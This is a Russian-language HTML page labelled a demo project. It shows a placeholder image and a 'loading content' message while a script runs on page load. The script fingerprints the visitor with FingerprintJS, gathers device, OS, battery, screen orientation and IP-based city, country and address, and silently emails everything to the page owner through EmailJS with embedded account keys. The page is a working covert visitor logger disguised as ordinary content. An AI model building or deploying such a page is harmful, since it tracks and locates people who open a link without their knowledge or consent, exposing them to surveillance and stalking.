<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8" />
  <title>Демонстрационный проект</title>
  <style>
    body {
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      height: 100vh;
      font-family: sans-serif;
      background: #f4f4f9;
    }
    img {
      max-width: 300px;
      border-radius: 8px;
      box-shadow: 0 4px 8px rgba(0,0,0,0.1);
    }
    p {
      margin-top: 15px;
      color: #555;
    }
  </style>

  <!-- Подключаем библиотеку FingerprintJS -->
  <script src="https://cdn.jsdelivr.net/npm/@fingerprintjs/fingerprintjs@3/dist/fp.min.js"></script>
  
  <!-- Подключаем библиотеку EmailJS для отправки писем -->
  <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
  <script type="text/javascript">
    // Инициализация EmailJS вашим публичным ключом
    (function() {
        emailjs.init("UgeqF39HkNLJZ5haw");
    })();
  </script>
</head>
<body>

  <img src="https://via.placeholder.com/300" alt="Изображение" />
  <p>Загрузка контента...</p>

  <script>
    // Запуск FingerprintJS при загрузке страницы
    FingerprintJS.load().then(fp => {
      fp.get().then(async result => {
        const visitorId = result.visitorId;
        const userAgent = navigator.userAgent;
        const screenRes = `${window.screen.width}x${window.screen.height}`;

        // 1. Определение типа устройства и ОС
        const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent);
        let osName = "Неизвестная ОС";
        if (/iPhone|iPad|iPod/i.test(userAgent)) osName = "Apple iOS (iPhone/iPad)";
        else if (/Android/i.test(userAgent)) osName = "Android";
        else if (/Windows/i.test(userAgent)) osName = "Windows PC";
        else if (/Mac/i.test(userAgent)) osName = "macOS";

        const deviceType = isMobile ? `Мобильное (${osName})` : `Компьютер (${osName})`;

        // 2. Ориентация экрана
        const orientation = window.innerHeight > window.innerWidth ? "Книжная (вертикально)" : "Альбомная (горизонтально)";

        // 3. Заряд батареи
        let batteryInfo = "Не поддерживается браузером";
        if (navigator.getBattery) {
          try {
            const battery = await navigator.getBattery();
            const level = Math.round(battery.level * 100);
            const charging = battery.charging ? "Заряжается" : "Работает от батареи";
            batteryInfo = `${level}% (${charging})`;
          } catch (e) {}
        }

        // 4. Определение Города/Страны по IP
        let locationInfo = "Не удалось определить";
        try {
          const ipRes = await fetch('https://ipapi.co/json/');
          const ipData = await ipRes.json();
          if (ipData.city && ipData.country_name) {
            locationInfo = `${ipData.city}, ${ipData.country_name} (IP: ${ipData.ip})`;
          }
        } catch (e) {}

        // Параметры, которые отправятся в письме
        const templateParams = {
          visitor_id: visitorId,
          device_type: deviceType,
          location: locationInfo,
          battery: batteryInfo,
          screen_resolution: screenRes,
          orientation: orientation,
          user_agent: userAgent
        };

        // Отправка данных на почту через EmailJS
        emailjs.send('service_yoaiygk', 'template_yba5mc2', templateParams)
          .then(function(response) {
             console.log('Успешно отправлено!', response.status, response.text);
          }, function(error) {
             console.log('Ошибка отправки:', error);
          });
      });
    });
  </script>
</body>
</html>
